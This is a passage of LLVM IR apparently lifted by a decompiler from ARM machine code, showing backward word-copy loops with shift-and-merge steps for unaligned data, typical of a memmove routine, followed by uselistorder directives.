  store i1 %v6_16ef8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16ef8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16f00

dec_label_pc_16f00:                               ; preds = %dec_label_pc_16f00.loopexit, %dec_label_pc_16edc
  %v2_16e4451 = phi i32 [ %v5_16ef4, %dec_label_pc_16f00.loopexit ], [ %v1_16ed0, %dec_label_pc_16edc ]
  %v0_16e3447 = phi i32 [ %v2_16ef8, %dec_label_pc_16f00.loopexit ], [ %v2_16ee0, %dec_label_pc_16edc ]
  %v0_16f00 = load i32, i32* %r1.global-to-local, align 4
  %v1_16f00 = add i32 %v0_16f00, 3
  store i32 %v1_16f00, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_16f08:                               ; preds = %dec_label_pc_16e98
  br i1 %v5_16f78, label %dec_label_pc_16f54, label %dec_label_pc_16f10

dec_label_pc_16f10:                               ; preds = %dec_label_pc_16f08
  store i32 %v2_16f74, i32* %r2.global-to-local, align 4
  %v3_16f14 = load i32, i32* @r4, align 4
  store i32 %v3_16f14, i32* %stack_var_-12, align 4
  %v6_16f14 = load i32, i32* @r5, align 4
  %v8_16f14 = inttoptr i32 %v6_16f14 to i8*
  store i8* %v8_16f14, i8** %stack_var_-8, align 4
  %v11_16f14 = load i32, i32* @lr, align 4
  br label %dec_label_pc_16f18

dec_label_pc_16f18:                               ; preds = %dec_label_pc_16f18.dec_label_pc_16f18_crit_edge, %dec_label_pc_16f10
  %v0_16f3c = phi i32 [ %v1_16f3c, %dec_label_pc_16f18.dec_label_pc_16f18_crit_edge ], [ %v0_16ed019, %dec_label_pc_16f10 ]
  %v0_16f1c = phi i32 [ %v0_16f1c.pre, %dec_label_pc_16f18.dec_label_pc_16f18_crit_edge ], [ %v1_16e88, %dec_label_pc_16f10 ]
  %v0_16f18 = phi i32 [ %v0_16f18.pre, %dec_label_pc_16f18.dec_label_pc_16f18_crit_edge ], [ %v2_16e8c, %dec_label_pc_16f10 ]
  %v3_16f18 = mul i32 %v0_16f18, 65536
  store i32 %v3_16f18, i32* %lr.global-to-local, align 4
  %v1_16f1c = add i32 %v0_16f1c, -4
  %v2_16f1c = inttoptr i32 %v1_16f1c to i32*
  %v3_16f1c = load i32, i32* %v2_16f1c, align 4
  store i32 %v3_16f1c, i32* @r3, align 4
  %v4_16f1c = add i32 %v0_16f1c, -8
  %v5_16f1c = inttoptr i32 %v4_16f1c to i32*
  %v6_16f1c = load i32, i32* %v5_16f1c, align 4
  store i32 %v6_16f1c, i32* %r4.global-to-local, align 4
  %v7_16f1c = add i32 %v0_16f1c, -12
  %v8_16f1c = inttoptr i32 %v7_16f1c to i32*
  %v9_16f1c = load i32, i32* %v8_16f1c, align 4
  store i32 %v9_16f1c, i32* %r5.global-to-local, align 4
  %v10_16f1c = add i32 %v0_16f1c, -16
  %v11_16f1c = inttoptr i32 %v10_16f1c to i32*
  %v12_16f1c = load i32, i32* %v11_16f1c, align 4
  store i32 %v10_16f1c, i32* %r1.global-to-local, align 4
  %v4_16f20 = udiv i32 %v12_16f1c, 65536
  %v5_16f20 = or i32 %v4_16f20, %v3_16f18
  store i32 %v5_16f20, i32* %lr.global-to-local, align 4
  %v3_16f24 = mul i32 %v12_16f1c, 65536
  %v4_16f28 = udiv i32 %v9_16f1c, 65536
  %v5_16f28 = or i32 %v3_16f24, %v4_16f28
  store i32 %v5_16f28, i32* @ip, align 4
  %v3_16f2c = mul i32 %v9_16f1c, 65536
  %v4_16f30 = udiv i32 %v6_16f1c, 65536
  %v5_16f30 = or i32 %v3_16f2c, %v4_16f30
  store i32 %v5_16f30, i32* %r5.global-to-local, align 4
  %v3_16f34 = mul i32 %v6_16f1c, 65536
  %v4_16f38 = udiv i32 %v3_16f1c, 65536
  %v5_16f38 = or i32 %v3_16f34, %v4_16f38
  store i32 %v5_16f38, i32* %r4.global-to-local, align 4
  %v1_16f3c = add i32 %v0_16f3c, -16
  %v2_16f3c = inttoptr i32 %v1_16f3c to i32*
  store i32 %v5_16f38, i32* %v2_16f3c, align 4
  %v4_16f3c = add i32 %v0_16f3c, -12
  %v5_16f3c = inttoptr i32 %v4_16f3c to i32*
  %v6_16f3c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_16f3c, i32* %v5_16f3c, align 4
  %v7_16f3c = add i32 %v0_16f3c, -8
  %v8_16f3c = inttoptr i32 %v7_16f3c to i32*
  %v9_16f3c = load i32, i32* @ip, align 4
  store i32 %v9_16f3c, i32* %v8_16f3c, align 4
  %v10_16f3c = add i32 %v0_16f3c, -4
  %v11_16f3c = inttoptr i32 %v10_16f3c to i32*
  %v12_16f3c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16f3c, i32* %v11_16f3c, align 4
  store i32 %v1_16f3c, i32* %r0.global-to-local, align 4
  %v0_16f40 = load i32, i32* %r2.global-to-local, align 4
  %v2_16f40 = add i32 %v0_16f40, -16
  store i32 %v2_16f40, i32* %r2.global-to-local, align 4
  %v6_16f44 = icmp slt i32 %v0_16f40, 16
  br i1 %v6_16f44, label %dec_label_pc_16f48, label %dec_label_pc_16f18.dec_label_pc_16f18_crit_edge

dec_label_pc_16f18.dec_label_pc_16f18_crit_edge:  ; preds = %dec_label_pc_16f18
  %v0_16f18.pre = load i32, i32* @r3, align 4
  %v0_16f1c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16f18

dec_label_pc_16f48:                               ; preds = %dec_label_pc_16f18
  %v2_16f48 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16f48, i32* @r4, align 4
  %v5_16f48 = load i8*, i8** %stack_var_-8, align 4
  %v6_16f48 = ptrtoint i8* %v5_16f48 to i32
  store i32 %v6_16f48, i32* @r5, align 4
  store i32 %v11_16f14, i32* @lr, align 4
  %v2_16f4c = add i32 %v0_16f40, -4
  store i32 %v2_16f4c, i32* %r2.global-to-local, align 4
  %v4_16f4c = add i32 %v0_16f40, 2147483632
  %v5_16f4c = and i32 %v2_16f4c, %v4_16f4c
  %v6_16f4c = icmp slt i32 %v5_16f4c, 0
  store i1 %v6_16f4c, i1* %cpsr_v.global-to-local, align 1
  %v7_16f4c = icmp slt i32 %v2_16f4c, 0
  store i1 %v7_16f4c, i1* %cpsr_n.global-to-local, align 1
  %v8_16f4c = icmp eq i32 %v2_16f4c, 0
  store i1 %v8_16f4c, i1* %cpsr_z.global-to-local, align 1
  %v5_16f50 = icmp slt i32 %v2_16f40, -12
  br i1 %v5_16f50, label %dec_label_pc_16f6c, label %dec_label_pc_16f54

dec_label_pc_16f54:                               ; preds = %dec_label_pc_16f48, %dec_label_pc_16f08, %dec_label_pc_16f54
  %v1_16f60 = phi i32 [ %v5_16f60, %dec_label_pc_16f54 ], [ %v1_16f3c, %dec_label_pc_16f48 ], [ %v0_16ed019, %dec_label_pc_16f08 ]
  %v0_16f54 = load i32, i32* @r3, align 4
  %v3_16f54 = mul i32 %v0_16f54, 65536
  store i32 %v3_16f54, i32* %ip.global-to-local, align 4
  %v0_16f58 = load i32, i32* %r1.global-to-local, align 4
  %v1_16f58 = add i32 %v0_16f58, -4
  %v2_16f58 = inttoptr i32 %v1_16f58 to i32*
  %v3_16f58 = load i32, i32* %v2_16f58, align 4
  store i32 %v3_16f58, i32* @r3, align 4
  store i32 %v1_16f58, i32* %r1.global-to-local, align 4
  %v4_16f5c = udiv i32 %v3_16f58, 65536
  %v5_16f5c = or i32 %v4_16f5c, %v3_16f54
  store i32 %v5_16f5c, i32* @ip, align 4
  %v2_16f60 = add i32 %v1_16f60, -4
  %v3_16f60 = inttoptr i32 %v2_16f60 to i32*
  store i32 %v5_16f5c, i32* %v3_16f60, align 4
  %v4_16f60 = load i32, i32* %r0.global-to-local, align 4
  %v5_16f60 = add i32 %v4_16f60, -4
  store i32 %v5_16f60, i32* %r0.global-to-local, align 4
  %v0_16f64 = load i32, i32* %r2.global-to-local, align 4
  %v2_16f64 = add i32 %v0_16f64, -4
  store i32 %v2_16f64, i32* %r2.global-to-local, align 4
  %v6_16f68 = icmp slt i32 %v0_16f64, 4
  br i1 %v6_16f68, label %dec_label_pc_16f6c.loopexit, label %dec_label_pc_16f54

dec_label_pc_16f6c.loopexit:                      ; preds = %dec_label_pc_16f54
  %v4_16f64 = sub i32 3, %v0_16f64
  %v5_16f64 = and i32 %v4_16f64, %v0_16f64
  %v6_16f64 = icmp slt i32 %v5_16f64, 0
  %v7_16f64 = icmp slt i32 %v2_16f64, 0
  store i1 %v6_16f64, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16f64, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16f6c

dec_label_pc_16f6c:                               ; preds = %dec_label_pc_16f6c.loopexit, %dec_label_pc_16f48
  %v2_16e4452 = phi i32 [ %v5_16f60, %dec_label_pc_16f6c.loopexit ], [ %v1_16f3c, %dec_label_pc_16f48 ]
  %v0_16e3448 = phi i32 [ %v2_16f64, %dec_label_pc_16f6c.loopexit ], [ %v2_16f4c, %dec_label_pc_16f48 ]
  %v0_16f6c = load i32, i32* %r1.global-to-local, align 4
  %v1_16f6c = add i32 %v0_16f6c, 2
  store i32 %v1_16f6c, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_16f74:                               ; preds = %dec_label_pc_16e88
  br i1 %v5_16f78, label %dec_label_pc_16fc0, label %dec_label_pc_16f7c

dec_label_pc_16f7c:                               ; preds = %dec_label_pc_16f74
  store i32 %v2_16f74, i32* %r2.global-to-local, align 4
  %v3_16f80 = load i32, i32* @r4, align 4
  store i32 %v3_16f80, i32* %stack_var_-12, align 4
  %v6_16f80 = load i32, i32* @r5, align 4
  %v8_16f80 = inttoptr i32 %v6_16f80 to i8*
  store i8* %v8_16f80, i8** %stack_var_-8, align 4
  %v11_16f80 = load i32, i32* @lr, align 4
  br label %dec_label_pc_16f84

dec_label_pc_16f84:                               ; preds = %dec_label_pc_16f84.dec_label_pc_16f84_crit_edge, %dec_label_pc_16f7c
  %v0_16fa8 = phi i32 [ %v1_16fa8, %dec_label_pc_16f84.dec_label_pc_16f84_crit_edge ], [ %v0_16ed019, %dec_label_pc_16f7c ]
  %v0_16f88 = phi i32 [ %v0_16f88.pre, %dec_label_pc_16f84.dec_label_pc_16f84_crit_edge ], [ %v1_16e88, %dec_label_pc_16f7c ]
  %v0_16f84 = phi i32 [ %v0_16f84.pre, %dec_label_pc_16f84.dec_label_pc_16f84_crit_edge ], [ %v2_16e8c, %dec_label_pc_16f7c ]
  %v3_16f84 = mul i32 %v0_16f84, 16777216
  store i32 %v3_16f84, i32* %lr.global-to-local, align 4
  %v1_16f88 = add i32 %v0_16f88, -4
  %v2_16f88 = inttoptr i32 %v1_16f88 to i32*
  %v3_16f88 = load i32, i32* %v2_16f88, align 4
  store i32 %v3_16f88, i32* @r3, align 4
  %v4_16f88 = add i32 %v0_16f88, -8
  %v5_16f88 = inttoptr i32 %v4_16f88 to i32*
  %v6_16f88 = load i32, i32* %v5_16f88, align 4
  store i32 %v6_16f88, i32* %r4.global-to-local, align 4
  %v7_16f88 = add i32 %v0_16f88, -12
  %v8_16f88 = inttoptr i32 %v7_16f88 to i32*
  %v9_16f88 = load i32, i32* %v8_16f88, align 4
  store i32 %v9_16f88, i32* %r5.global-to-local, align 4
  %v10_16f88 = add i32 %v0_16f88, -16
  %v11_16f88 = inttoptr i32 %v10_16f88 to i32*
  %v12_16f88 = load i32, i32* %v11_16f88, align 4
  store i32 %v10_16f88, i32* %r1.global-to-local, align 4
  %v4_16f8c = udiv i32 %v12_16f88, 256
  %v5_16f8c = or i32 %v4_16f8c, %v3_16f84
  store i32 %v5_16f8c, i32* %lr.global-to-local, align 4
  %v3_16f90 = mul i32 %v12_16f88, 16777216
  %v4_16f94 = udiv i32 %v9_16f88, 256
  %v5_16f94 = or i32 %v3_16f90, %v4_16f94
  store i32 %v5_16f94, i32* @ip, align 4
  %v3_16f98 = mul i32 %v9_16f88, 16777216
  %v4_16f9c = udiv i32 %v6_16f88, 256
  %v5_16f9c = or i32 %v3_16f98, %v4_16f9c
  store i32 %v5_16f9c, i32* %r5.global-to-local, align 4
  %v3_16fa0 = mul i32 %v6_16f88, 16777216
  %v4_16fa4 = udiv i32 %v3_16f88, 256
  %v5_16fa4 = or i32 %v3_16fa0, %v4_16fa4
  store i32 %v5_16fa4, i32* %r4.global-to-local, align 4
  %v1_16fa8 = add i32 %v0_16fa8, -16
  %v2_16fa8 = inttoptr i32 %v1_16fa8 to i32*
  store i32 %v5_16fa4, i32* %v2_16fa8, align 4
  %v4_16fa8 = add i32 %v0_16fa8, -12
  %v5_16fa8 = inttoptr i32 %v4_16fa8 to i32*
  %v6_16fa8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_16fa8, i32* %v5_16fa8, align 4
  %v7_16fa8 = add i32 %v0_16fa8, -8
  %v8_16fa8 = inttoptr i32 %v7_16fa8 to i32*
  %v9_16fa8 = load i32, i32* @ip, align 4
  store i32 %v9_16fa8, i32* %v8_16fa8, align 4
  %v10_16fa8 = add i32 %v0_16fa8, -4
  %v11_16fa8 = inttoptr i32 %v10_16fa8 to i32*
  %v12_16fa8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16fa8, i32* %v11_16fa8, align 4
  store i32 %v1_16fa8, i32* %r0.global-to-local, align 4
  %v0_16fac = load i32, i32* %r2.global-to-local, align 4
  %v2_16fac = add i32 %v0_16fac, -16
  store i32 %v2_16fac, i32* %r2.global-to-local, align 4
  %v6_16fb0 = icmp slt i32 %v0_16fac, 16
  br i1 %v6_16fb0, label %dec_label_pc_16fb4, label %dec_label_pc_16f84.dec_label_pc_16f84_crit_edge

dec_label_pc_16f84.dec_label_pc_16f84_crit_edge:  ; preds = %dec_label_pc_16f84
  %v0_16f84.pre = load i32, i32* @r3, align 4
  %v0_16f88.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16f84

dec_label_pc_16fb4:                               ; preds = %dec_label_pc_16f84
  %v2_16fb4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16fb4, i32* @r4, align 4
  %v5_16fb4 = load i8*, i8** %stack_var_-8, align 4
  %v6_16fb4 = ptrtoint i8* %v5_16fb4 to i32
  store i32 %v6_16fb4, i32* @r5, align 4
  store i32 %v11_16f80, i32* @lr, align 4
  %v2_16fb8 = add i32 %v0_16fac, -4
  store i32 %v2_16fb8, i32* %r2.global-to-local, align 4
  %v4_16fb8 = add i32 %v0_16fac, 2147483632
  %v5_16fb8 = and i32 %v2_16fb8, %v4_16fb8
  %v6_16fb8 = icmp slt i32 %v5_16fb8, 0
  store i1 %v6_16fb8, i1* %cpsr_v.global-to-local, align 1
  %v7_16fb8 = icmp slt i32 %v2_16fb8, 0
  store i1 %v7_16fb8, i1* %cpsr_n.global-to-local, align 1
  %v8_16fb8 = icmp eq i32 %v2_16fb8, 0
  store i1 %v8_16fb8, i1* %cpsr_z.global-to-local, align 1
  %v5_16fbc = icmp slt i32 %v2_16fac, -12
  br i1 %v5_16fbc, label %dec_label_pc_16fd8, label %dec_label_pc_16fc0

dec_label_pc_16fc0:                               ; preds = %dec_label_pc_16fb4, %dec_label_pc_16f74, %dec_label_pc_16fc0
  %v1_16fcc = phi i32 [ %v5_16fcc, %dec_label_pc_16fc0 ], [ %v1_16fa8, %dec_label_pc_16fb4 ], [ %v0_16ed019, %dec_label_pc_16f74 ]
  %v0_16fc0 = load i32, i32* @r3, align 4
  %v3_16fc0 = mul i32 %v0_16fc0, 16777216
  store i32 %v3_16fc0, i32* %ip.global-to-local, align 4
  %v0_16fc4 = load i32, i32* %r1.global-to-local, align 4
  %v1_16fc4 = add i32 %v0_16fc4, -4
  %v2_16fc4 = inttoptr i32 %v1_16fc4 to i32*
  %v3_16fc4 = load i32, i32* %v2_16fc4, align 4
  store i32 %v3_16fc4, i32* @r3, align 4
  store i32 %v1_16fc4, i32* %r1.global-to-local, align 4
  %v4_16fc8 = udiv i32 %v3_16fc4, 256
  %v5_16fc8 = or i32 %v4_16fc8, %v3_16fc0
  store i32 %v5_16fc8, i32* @ip, align 4
  %v2_16fcc = add i32 %v1_16fcc, -4
  %v3_16fcc = inttoptr i32 %v2_16fcc to i32*
  store i32 %v5_16fc8, i32* %v3_16fcc, align 4
  %v4_16fcc = load i32, i32* %r0.global-to-local, align 4
  %v5_16fcc = add i32 %v4_16fcc, -4
  store i32 %v5_16fcc, i32* %r0.global-to-local, align 4
  %v0_16fd0 = load i32, i32* %r2.global-to-local, align 4
  %v2_16fd0 = add i32 %v0_16fd0, -4
  store i32 %v2_16fd0, i32* %r2.global-to-local, align 4
  %v6_16fd4 = icmp slt i32 %v0_16fd0, 4
  br i1 %v6_16fd4, label %dec_label_pc_16fd8.loopexit, label %dec_label_pc_16fc0

dec_label_pc_16fd8.loopexit:                      ; preds = %dec_label_pc_16fc0
  %v4_16fd0 = sub i32 3, %v0_16fd0
  %v5_16fd0 = and i32 %v4_16fd0, %v0_16fd0
  %v6_16fd0 = icmp slt i32 %v5_16fd0, 0
  %v7_16fd0 = icmp slt i32 %v2_16fd0, 0
  store i1 %v6_16fd0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16fd0, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16fd8

dec_label_pc_16fd8:                               ; preds = %dec_label_pc_16fd8.loopexit, %dec_label_pc_16fb4
  %v2_16e4453 = phi i32 [ %v5_16fcc, %dec_label_pc_16fd8.loopexit ], [ %v1_16fa8, %dec_label_pc_16fb4 ]
  %v0_16e3449 = phi i32 [ %v2_16fd0, %dec_label_pc_16fd8.loopexit ], [ %v2_16fb8, %dec_label_pc_16fb4 ]
  %v0_16fd8 = load i32, i32* %r1.global-to-local, align 4
  %v1_16fd8 = add i32 %v0_16fd8, 1
  store i32 %v1_16fd8, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_16fcc, { 0, 2, 1 }
  uselistorder i32 %v3_16fc0, { 1, 0 }
  uselistorder i32 %v2_16fb8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16fa8, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_16f88, { 1, 0 }
  uselistorder i32 %v3_16f84, { 1, 0 }
  uselistorder i32 %v0_16f88, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16fa8, { 3, 2, 1, 0 }
  uselistorder i32 %v5_16f60, { 0, 2, 1 }
  uselistorder i32 %v3_16f54, { 1, 0 }
  uselistorder i32 %v2_16f4c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16f3c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_16f1c, { 1, 0 }
  uselistorder i32 %v3_16f18, { 1, 0 }
  uselistorder i32 %v0_16f1c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16f3c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_16ef4, { 0, 2, 1 }
  uselistorder i32 %v3_16ee8, { 1, 0 }
  uselistorder i32 %v2_16ee0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16ed0, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_16eb0, { 1, 0 }
  uselistorder i32 %v3_16eac, { 1, 0 }
  uselistorder i32 %v0_16eb0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16ed0, { 3, 2, 1, 0 }
  uselistorder i1 %v5_16f78, { 2, 0, 1 }
  uselistorder i32 %v0_16e90, { 1, 0 }
  uselistorder i32 %v0_16f7c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_16ed019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_16e80, { 2, 1, 0 }
  uselistorder i32 %v0_16e80, { 2, 0, 1 }
  uselistorder i32 %v2_16e78, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_16e78, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16e78, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_16ed020, { 2, 1, 0 }
  uselistorder i32 %v11_16e54, { 1, 0 }
  uselistorder i32 %v7_16e54, { 1, 0 }
  uselistorder i32 %v1_16e34, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_16e34, { 1, 2, 0, 3 }
  uselistorder i32 %v2_16e38, { 1, 0 }
  uselistorder i32 %v7_16e2c, { 0, 2, 1 }
  uselistorder i32 %v10_16e28, { 1, 0 }
  uselistorder i32 %v9_16e20, { 1, 0, 2 }
  uselistorder i32 %v6_16e1c, { 1, 0 }
  uselistorder i32 %v2_16e14, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_16e14, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_16e24, { 0, 3, 2, 1 }
  uselistorder i32 %v7_16e08, { 0, 2, 1 }
  uselistorder i32 %v13_16e04, { 1, 0 }
  uselistorder i32 %v4_16e00, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_16e00, { 2, 0, 1 }
  uselistorder i32 %v6_16e08, { 0, 3, 2, 1 }
  uselistorder i32 %v7_16df8, { 0, 2, 1 }
  uselistorder i32 %v16_16df4, { 1, 0 }
  uselistorder i32 %v4_16df0, { 1, 2, 0 }
  uselistorder i32 %v0_16e00.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_16df8, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_16de4, { 0, 3, 2, 1 }
  uselistorder i32 %v10_16de0, { 1, 0 }
  uselistorder i32 %v1_16ddc, { 1, 0 }
  uselistorder i32 %v10_16dd8, { 1, 0 }
  uselistorder i32 %v0_16dd8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16ddc, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_16dd0, { 0, 2, 1 }
  uselistorder i32 %v2_16dc4, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_16dc4, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_16ddc37, { 1, 2, 0 }
  uselistorder i32 %v1_16dbc, { 2, 1, 0 }
  uselistorder i32 %v1_16db4, { 2, 3, 1, 0 }
  uselistorder i32 %v2_16dac, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_16da8, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_16da4, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_16da4, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_16d94, { 0, 2, 1 }
  uselistorder i32 %v4_16d90, { 1, 0 }
  uselistorder i32 %v3_16d84, { 1, 0 }
  uselistorder i32 %v1_16d7c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16d70, { 1, 0 }
  uselistorder i32 %v12_16d6c, { 0, 2, 1 }
  uselistorder i32 %v8_16d4c, { 1, 0, 2 }
  uselistorder i32 %v5_16d4c, { 1, 0, 2 }
  uselistorder i32 %v2_16d4c, { 1, 0, 2 }
  uselistorder i32 %v0_16d4c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16d6c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_16d28, { 0, 2, 1 }
  uselistorder i32 %v4_16d24, { 1, 0 }
  uselistorder i32 %v3_16d18, { 1, 0 }
  uselistorder i32 %v1_16d10, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16d04, { 1, 0 }
  uselistorder i32 %v12_16d00, { 0, 2, 1 }
  uselistorder i32 %v8_16ce0, { 1, 0, 2 }
  uselistorder i32 %v5_16ce0, { 1, 0, 2 }
  uselistorder i32 %v2_16ce0, { 1, 0, 2 }
  uselistorder i32 %v0_16ce0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16d00, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_16cbc, { 0, 2, 1 }
  uselistorder i32 %v4_16cb8, { 1, 0 }
  uselistorder i32 %v3_16cac, { 1, 0 }
  uselistorder i32 %v1_16ca4, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16c98, { 1, 0 }
  uselistorder i32 %v12_16c94, { 0, 2, 1 }
  uselistorder i32 %v8_16c74, { 1, 0, 2 }
  uselistorder i32 %v5_16c74, { 1, 0, 2 }
  uselistorder i32 %v2_16c74, { 1, 0, 2 }
  uselistorder i32 %v0_16c74, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16c94, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_16cd0, { 0, 2, 1 }
  uselistorder i32 %v1_16ccc, { 2, 0, 1, 3 }
  uselistorder i32 %v4_16c50, { 2, 0, 1, 3 }
  uselistorder i32 %v2_16c50, { 2, 0, 1, 3 }
  uselistorder i32 %v0_16cd4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_16d6c76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_16c44, { 1, 0 }
  uselistorder i32 %v0_16c44, { 3, 1, 0, 2 }
  uselistorder i32 %v2_16c3c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_16c3c, { 1, 0, 2 }
  uselistorder i32 %v0_16c3c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_16d6c77, { 1, 0 }
  uselistorder i32 %v1_16c1c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_16c24, { 1, 0 }
  uselistorder i32 %v0_16bf8, { 3, 0, 1, 2 }
  uselistorder i32 %v1_16bec, { 1, 2, 0, 3 }
  uselistorder i32 %v5_16bd8, { 1, 0, 2 }
  uselistorder i32 %v1_16bd4, { 1, 0 }
  uselistorder i32 %v1_16bcc, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_16bcc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_16bc4, { 0, 2, 1 }
  uselistorder i32 %v3_16bc4, { 3, 0, 1, 2 }
  uselistorder i1 %v0_16bc4, { 1, 0 }
  uselistorder i1 %v1_16bc4, { 1, 0 }
  uselistorder i32 %v3_16bc0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_16bb8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16ba4, { 1, 2, 0 }
  uselistorder i32 %v1_16b9c, { 0, 2, 1 }
  uselistorder i32 %v12_16b98, { 0, 1, 3, 2 }
  uselistorder i32 %v0_16b8c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16b90, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_16b80, { 0, 2, 1 }
  uselistorder i32 %v1_16b78, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_16b78, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_16b70, { 1, 0 }
  uselistorder i32 %v1_16b68, { 2, 1, 0 }
  uselistorder i32 %v2_16b60, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_16b60, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_16b5c, { 1, 0 }
  uselistorder i32 %v2_16b50, { 1, 0 }
  uselistorder i32 %v1_16b50, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_16b50, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 31, 1, 2, 3, 4, 5, 32, 6, 7, 8, 9, 10, 33, 11, 12, 13, 14, 15, 34, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 35, 36, 68, 37, 38, 39, 40, 41, 69, 42, 43, 44, 45, 46, 70, 47, 48, 49, 50, 51, 71, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 72 }
  uselistorder i32* %r1.global-to-local, { 0, 3, 1, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 23, 19, 20, 21, 22, 24, 25, 27, 26, 28, 29, 38, 30, 31, 39, 32, 40, 33, 41, 34, 35, 36, 37, 42, 45, 43, 55, 44, 46, 49, 47, 56, 48, 50, 53, 51, 57, 52, 54, 58, 59, 62, 60, 63, 61, 64, 65, 66, 67 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 23, 3, 4, 24, 5, 6, 7, 8, 9, 10, 25, 11, 13, 12, 14, 15, 26, 16, 17, 27, 18, 19, 20, 21, 28, 29, 31, 30, 32, 33, 34 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 2, 26, 0, 27, 1, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
